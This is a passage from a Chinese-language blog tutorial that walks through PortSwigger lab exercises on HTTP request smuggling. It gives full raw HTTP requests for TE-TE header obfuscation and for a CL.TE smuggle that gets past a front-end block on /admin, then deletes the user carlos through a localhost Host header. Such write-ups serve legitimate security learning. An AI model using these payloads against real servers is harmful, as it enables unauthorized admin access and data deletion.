的场景。其实这个场景也可以认为是相同字段的场景处理，比如说在处理两个 TE 字段，如果取第二个 TE 字段作为解析标准，而第二个字段值非正常或者解析出错，就可能会忽略掉 TE 字段，而使用 CL 字段进行解析。比如在这个 LAB 中，我们发送两遍如下请求：</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: acfd1f201f5fb528809b582e004200a3.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQ</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="hljs-attribute">Content-length</span>: 4</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="hljs-attribute">Transfer-encoding</span>: nothing</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">12</span></span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这里同上一个场景一样，需要在最后添加两个 CRLF ：</p><p></p><figure class="highlight taggerscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br><span class="line"><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>我们就可以得到如下图的响应：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191123002425.png" alt=""></p><p>我们可以看到这里是用了两个 TE 字段，并且第二个 TE 字段值非标准值，这里 Front 选择对第一个 TE 进行优先处理，整个请求则为正常请求，会转发给 Backend 服务器，而 Backend 服务器以第二个 TE 进行优先处理，而第二个 TE 值非正常，则会取 CL 字段进行处理，这样这个请求就会因为 CL 字段设置的值 4 而被拆分为两个请求。</p><p>第一个请求：</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: acfd1f201f5fb528809b582e004200a3.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=9swxitdhJRXeFhq77wGSU7fKw0VTiuzQ</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="hljs-attribute">Content-length</span>: 4</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="hljs-attribute">Transfer-encoding</span>: nothing</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">12</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>第二个请求：</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GPOST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这样就发送了一个无法识别的 HTTP Method GPOST 请求。</p><h2 id="Attack-Surface"><a href="#Attack-Surface" class="headerlink" title="Attack Surface"></a>Attack Surface</h2><p>上面我们大概介绍了几种攻击方式，下面我来看看这些攻击方式可以用来干嘛。同样我们将配合实验环境帮助理解与复现。</p><h3 id="Bypass-Front-end-Security-Controls"><a href="#Bypass-Front-end-Security-Controls" class="headerlink" title="Bypass Front-end Security Controls"></a>Bypass Front-end Security Controls</h3><p>这里提供了两个实验环境，一个是 CL-TE 形式的 <a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te" target="_blank" rel="noopener">Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability</a> ，一个是TE-CL 形式的 <a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl" target="_blank" rel="noopener">Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability</a>，两个实验最终达到的目的一样，这里我们随便选用 CL-TE 的来进行实验。</p><blockquote><p>​    This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. There’s an admin panel at /admin, but the front-end server blocks access to it.</p><p>To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.</p></blockquote><p>架构一样，只不过这次我们需要去利用 HTTP Smuggling 获取 admin 权限并删除 carlos 用户。</p><p>我们生成 LAB 之后，直接访问<code>/admin</code>会发现 <code>"Path /admin is blocked"</code>，看来不能通过正常方式访问<code>/admin</code>，那我们尝试 HTTP Smuggling 的方式，发送如下数据包两次：</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 28</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /admin HTTP/1.1</span><br></pre></td></tr></tbody></table></figure><p></p><p>得到的响应如下两图</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191123154656.png" alt=""></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191123154609.png" alt=""></p><p>可以看到第二个请求我们得到了<code>/admin</code>的响应</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container is-page"</span>&gt;</span></span><br><span class="line">  Admin interface only available if logged in as an administrator, or if requested as localhost</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>于是我们添加 HOST 头再次发送几次</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 45</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: localhost</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以看到成功访问到了<code>/admin</code>面板内容，如果不成功可以多发送几次试试看</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191123155053.png" alt=""></p><p>得到了删除的 api ，于是我们再利用 HTTP Smuggling 访问这个 <code>/admin/delete?username=carlos</code> 即可，构造如下数据包：</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 63</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: localhost</span><br></pre></td></tr></tbody></table></figure><p></p><p><img 